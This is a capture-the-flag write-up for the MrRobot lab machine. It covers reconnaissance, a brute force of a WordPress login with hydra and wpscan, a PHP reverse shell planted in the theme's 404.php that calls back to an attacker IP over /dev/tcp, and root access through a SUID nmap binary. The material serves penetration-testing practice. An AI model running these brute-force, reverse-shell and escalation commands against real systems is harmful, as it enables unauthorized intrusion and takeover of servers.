# 🧠 CTF Write-Up: MrRobot – HTB-Retired  
**Author**: HackMalayali  
**Date**: 06/12/2025  
**Difficulty**: [Easy]  
**Target IP**: 192.168.215.5



## 🎯 Overview

This machine simulates a real-world vulnerable web server running WordPress.  
The objective is to gain access to the system, escalate privileges, and capture all three flags (if applicable).


## 🔍 Phase 1: Reconnaissance

### 🔸 Nmap Scan
bash
nmap -sC -sV -oN nmap.txt 192.168.215.5


**Findings**:

 
* Port 80 (HTTP) – Apache + WordPress
* Port 443 (HTTPS)
* Port 22 (SSH) – OpenSSH (closed)




## 🌐 Phase 2: Enumeration

### 🔸 Gobuster/dirb

bash
gobuster dir -u http://192.168.215.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


**Interesting Paths**:

* `/robots.txt` → `fsocity.dic`, `key-1-of-3.txt`
* `/wp-login.php` (WordPress login)



## 🚪 Phase 3: Exploitation

### 🔸 Brute Force WordPress Login

Used `fsocity.dic` as username and password wordlist.

```
bash
hydra -l elliot -P fsocity.dic 192.168.215.5 http-post-form "wp-login.php:log=^USER^&pwd=^PASS^:The Password" -vV
wpscan --url http://192.168.215.5 --usernames admin --passwords fsocity.dic
```

**Creds Found**:

* `Elliot / ER28-0652`

---

### 🔸 Upload PHP Reverse Shell

* Gained access to Appearance > 404.php
* Injected reverse shell:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.215.4/4444 0>&1'"); ?>
```

* Setup listener:

```bash
rlwrap nc -lvnp 4444
```

## 🐚 Phase 4: Post-Exploitation

**Got Shell As**: `daemon`
**Upgraded Shell**:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 🔸 Collected Info:

```bash
whoami
id
uname -a
find / -perm -4000 -type f 2>/dev/null
```



## 👑 Phase 5: Privilege Escalation

### 🔸 SUID Binary Found: `/usr/local/bin/nmap`

**Exploitation**:

```bash
nmap --interactive
!sh
```

**Got Root Shell**:

```bash
whoami → root
```



## 🏁 Flags Captured

* ✅ `key-1-of-3.txt`
* ✅ `key-2-of-3.txt`
* ✅ `key-3-of-3.txt`



## 💡 Lessons Learned

* Always check `robots.txt` and WordPress login pages.
* Enumeration is everything
* SUID binaries can be deadly if misconfigured
* SUID misconfigurations are a common root escalation path.
* GTFOBins is your best friend for SUID abuse.
